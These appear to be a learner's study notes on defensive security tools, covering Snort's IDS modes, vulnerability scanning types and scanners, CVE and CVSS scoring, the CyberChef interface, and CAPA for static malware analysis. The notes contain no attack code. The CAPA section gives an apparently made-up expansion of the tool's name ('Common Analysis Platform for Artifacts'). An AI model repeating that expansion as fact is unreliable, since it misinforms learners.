| **Signature-Based** | Quickly stopping known, documented attacks. | Cannot detect zero-day vulnerabilities. |
| **Anomaly-Based** | Catching new, unseen zero-day attacks. | Generates many false positives; requires heavy tuning. |
| **Hybrid** | Comprehensive coverage combining speed and zero-day detection. | Higher processing overhead and complexity. |

**Introduction to Snort and Operating Modes**

**Key Concepts:**
* **What is Snort?** Developed in 1998, Snort is one of the most famous and widely used open-source Intrusion Detection Systems (IDS) in the world. It primarily relies on signature-based detection but also incorporates anomaly-based features.
* **The Power of Rules:** * *Built-in Rules:* Snort comes pre-packaged with a massive database of rules designed to catch known attack patterns.
    * *Custom Rules:* You are not locked into the defaults! You can turn off noisy built-in rules and write highly specific custom rules tailored strictly to your organization's environment.

### Snort Operating Modes
While Snort is famous as an IDS, it is actually a highly versatile packet-processing tool. It can be launched in one of three modes depending on what the analyst needs to accomplish:

| Mode | Description | Primary Use Case |
| :--- | :--- | :--- |
| **Packet Sniffer Mode** | Simply reads network packets off the wire and displays them on the console. It performs *no* security analysis or detection in this mode. | **Network Troubleshooting:** Used by sysadmins to get real-time insights into traffic flow to diagnose connectivity or performance issues. |
| **Packet Logging Mode** | Captures network traffic and saves it to a file on the disk in standard `PCAP` (Packet Capture) format. | **Forensic Investigations:** Used by security teams to save historical traffic data so they can perform deep-dive root cause analysis after a breach has occurred. |
| **NIDS Mode** <br>*(Network Intrusion Detection System)* | **The main event.** Snort actively monitors network traffic in real-time, compares the packets against its active rule files, and generates alerts when malicious signatures are matched. | **Proactive Threat Monitoring:** Used by SOC teams to actively detect and get alerted to incoming attacks on the network. |

**Takeaways / Notes:**
* For actual security monitoring, you will almost always run Snort in **NIDS Mode**. However, knowing how to leverage it as a quick packet sniffer or logger is a great utility to have in your back pocket during an investigation!

---

## Room: [Vulnerability Scanner Overview]

**Vulnerability Scanning**

**Key Concepts:**
* **Vulnerability Scanning:** The proactive inspection of digital systems to find weaknesses before attackers do. It is often required quarterly or annually by regulatory compliance frameworks.
* **Automated vs. Manual:** Manual hunting is too slow for enterprise networks. Automated vulnerability scanners (like Nessus or OpenVAS) take an IP range, scan the hosts, and generate detailed, easy-to-read reports.
* **Patching:** The act of fixing the identified vulnerabilities by updating or modifying the software/system.



### 1. Authenticated vs. Unauthenticated Scans
The level of access the scanner has to the target dictates how deep the scan can go.

| Feature | Authenticated Scans | Unauthenticated Scans |
| :--- | :--- | :--- |
| **Requirements** | Requires the target host's login credentials. | Needs only the target's IP address (no credentials). |
| **Perspective** | Shows what an attacker could do *if they already had access* to the system. | Shows what an external attacker can see from the *outside*. |
| **Visibility** | Deep visibility. Can scan internal configurations, registry keys, and installed applications. | Surface-level visibility. Less resource-intensive and easier to set up. |
| **Example** | Scanning an internal database using admin credentials to check for misconfigurations. | Scanning a public-facing web server to see if any open ports are vulnerable. |

### 2. Internal vs. External Scans
This categorization is based on *where* the scanner is located relative to the network perimeter (firewall).



| Feature | Internal Scans | External Scans |
| :--- | :--- | :--- |
| **Location** | Conducted from *inside* the corporate network. | Conducted from *outside* the corporate network (the Internet). |
| **Focus** | Vulnerabilities exploitable by malicious insiders or attackers who have already breached the perimeter. | Vulnerabilities exposed directly to the public internet. |
| **Threat Model** | "What happens if an employee's laptop gets infected or goes rogue?" | "What happens if a random hacker on the internet targets our public IP?" |

**Takeaways / Notes:**
* **The Standard Pairing:** In most enterprise security programs, **Authenticated Scans** are run **Internally** (to ensure all employee workstations and internal servers are fully patched), while **Unauthenticated Scans** are run **Externally** (to mimic exactly what a blind attacker would see from the outside).

**Automated Vulnerability Scanners**

**Key Concepts:**
* **The Need for Automation:** Manual vulnerability hunting across an enterprise network is computationally and humanly impossible. Automated scanners bridge this gap by rapidly checking entire network ranges against massive databases of known vulnerabilities.
* **Risk Scoring:** Scanners don't just find vulnerabilities; they prioritize them. They assign risk scores (often using the CVSS framework) based on how easy the vulnerability is to exploit and how devastating the impact would be to that specific asset.
* **Actionable Reporting:** A scanner is only as good as its output. Modern scanners generate detailed reports containing the discovered vulnerabilities, risk scores, detailed descriptions, and, most importantly, the **remediation methods** (how to patch or fix the flaw).


### Industry-Standard Scanners Comparison

| Scanner | Developer / Owner | Deployment Model | Key Characteristics & Features |
| :--- | :--- | :--- | :--- |
| **Nessus** | Tenable | On-Premises | The industry heavyweight. Started open-source in 1998, now proprietary. Offers extensive, deep scanning options. Available in limited free versions (Nessus Essentials) and enterprise paid versions. |
| **Qualys** | Qualys | Cloud-Based | A cloud-native, subscription-based platform. Excellent for continuous monitoring, asset management, and compliance checks without the overhead of managing local scanning hardware. |
| **Nexpose** | Rapid7 | On-Prem / Hybrid | Subscription-based scanner that excels at continuous asset discovery. It dynamically adjusts vulnerability risk scores based on the actual business value of the affected asset. |
| **OpenVAS** | Greenbone Security | On-Premises | The premier **open-source** vulnerability assessment system. While less extensive than expensive commercial tools, it provides a complete vulnerability scanning experience. Perfect for small organizations, home labs, and CTFs. |

**Takeaways / Notes:**
* There is no single "best" scanner. The choice always comes down to the organization's budget, infrastructure type (do they want a cloud solution like Qualys or strictly on-prem like Nessus?), and the required depth of analysis.
* Since OpenVAS is completely free and open-source, it is the absolute best place to start getting hands-on experience with automated vulnerability management!

**CVE AND CVSS**

**Key Concepts:**
Just like an IT help desk assigns a unique ticket number to track a user's complaint, the cybersecurity industry needs a standardized way to track and prioritize software vulnerabilities. 

### 1. CVE (Common Vulnerabilities and Exposures)
Think of a CVE as the unique "ticket number" assigned to a specific vulnerability. Maintained by the MITRE Corporation, the CVE database acts as a global, public reference for newly discovered software flaws so organizations can quickly identify and patch them.

* **Structure of a CVE Number:**
  * **Prefix:** Always starts with `CVE`.
  * **Year:** The year the vulnerability was discovered or reported (e.g., `2024`).
  * **Arbitrary Digits:** A unique sequence of four or more digits assigned to that specific flaw (e.g., `9374`).
  * *Example:* `CVE-2024-9374`

---

### 2. CVSS (Common Vulnerability Scoring System)
If you have thousands of IT tickets (or vulnerabilities), you need a way to prioritize them. The CVSS provides that prioritization by assigning a severity score to each CVE.

* **How it works:** The score is calculated based on multiple factors, including the vulnerability's impact and how easy it is for an attacker to exploit it. 
* **The Scale:** Scores range from 0 to 10. The higher the score, the more critical the vulnerability.

**CVSS Severity Ratings:**

| CVSS Score Range | Severity Level |
| :--- | :--- |
| **0.0 - 3.9** | Low |
| **4.0 - 6.9** | Medium |
| **7.0 - 8.9** | High |
| **9.0 - 10.0** | Critical |

**Takeaways / Notes:**
* Whenever a zero-day drops, the **CVE** tells you *what* it is, and the **CVSS** score tells you *how fast* you need to drop everything and patch it!

---

## Room: [CyberChef]

**What is CyberChef?**
* CyberChef is a simple, intuitive web-based application designed to help with various “cyber” operation tasks within your web browser. Think of it as a Swiss Army knife for data - like having a toolbox of different tools designed to do a specific task. These tasks range from simple encodings like XOR or Base64 to complex operations like AES encryption or RSA decryption. CyberChef operates on recipes, a series of operations executed in order.

**Intro**

**Key Concepts:**
The CyberChef interface is divided into four main sections that flow from left to right. You select a tool, add it to your workflow, provide the raw data, and view the transformed result.



### 1. The Operations Area (The Toolkit)
Located on the far left, this is the searchable repository of every function CyberChef can perform. You can hover over any operation to see a description, an example, and a link to its Wikipedia page.

**Common Operations for Cyber Security:**

| Operation | Description | Example Input -> Output |
| :--- | :--- | :--- |
| **From Morse Code** | Translates Morse Code into alphanumeric characters. | `- .... .-. . .- - ...` $\rightarrow$ `THREATS` |
| **URL Encode** | Encodes problematic characters into percent-encoding (URI format). | `https://tryhackme.com` $\rightarrow$ `https%3A%2F%2Ftryhackme%2Ecom` |
| **To Base64** | Encodes raw data into an ASCII Base64 string. | `This is fun!` $\rightarrow$ `VGhpcyBpcyBmdW4h` |
| **To Hex** | Converts a string to hexadecimal bytes. | `Hex` $\rightarrow$ `48 65 78` |
| **To Decimal** | Converts data to an ordinal integer array. | `Dec` $\rightarrow$ `68 101 99` |
| **ROT13** | A simple Caesar substitution cipher that rotates alphabet characters by 13 places. | `Cyber` $\rightarrow$ `Plore` |

### 2. The Recipe Area (The Heart of the Tool)
This is where you drag and drop operations to build your data processing pipeline. 
* **Chaining:** You can stack multiple operations on top of each other. The output of the first operation automatically becomes the input for the second, and so on.
* **Baking:** Clicking the **BAKE!** button executes the recipe.
* **Auto Bake:** A highly useful checkbox that automatically processes your data in real-time as you type or modify the recipe, saving you from clicking "Bake" repeatedly.
* You can also **Save**, **Load**, or **Clear** recipes using the icons at the top of this panel.

### 3. The Input Area (The Raw Data)
This is where you place the data you want to analyze. 
* **Flexibility:** You can type text, paste data, or drag-and-drop entire files and folders directly into this pane.
* **Tabs:** You can open multiple input tabs if you are working on different pieces of evidence simultaneously.

### 4. The Output Area (The Result)
This panel displays the final, processed data after it has run through your entire recipe.
* **Save output to file:** Export your findings as a `.dat` file.
* **Copy raw output:** Instantly copy the exact result to your clipboard.
* **Replace input with output:** A handy button that takes your result and throws it back into the Input area, which is great if you want to start a brand new recipe using the newly decoded data.

**Takeaways / Notes:**
* CyberChef runs entirely client-side in your web browser. This means that once the page is loaded, your data is processed locally on your machine and is *not* sent to an external server, making it safe for analyzing sensitive logs or malware strings!

---

## Room: [CAPA: The Basics]

* **Dynamic Analysis:** Process of analyzing malware by running it in a controlled environment like a sandbox.

* **Static Analysis:** Process of analyzing malware without executing it, but in a controlled environment.

* Static Analysis is conducted using CAPA

**CAPA (Common Analysis Platform for Artifacts):** A tool developed by the FireEye Mandiant team. designed to identify the capabilities present in executable files like Portable Executables (PE), ELF binaries, .NET modules, shellcode, and even sandbox reports. It does so by analyzing the file and applying a set of rules that describe common behaviours, allowing it to determine what the program is capable of doing, such as network communication, file manipulation, process injection, and many more.

* useful in malware analysis and threat hunting, where understanding a binary's capabilities is crucial for incident response and defensive measures.
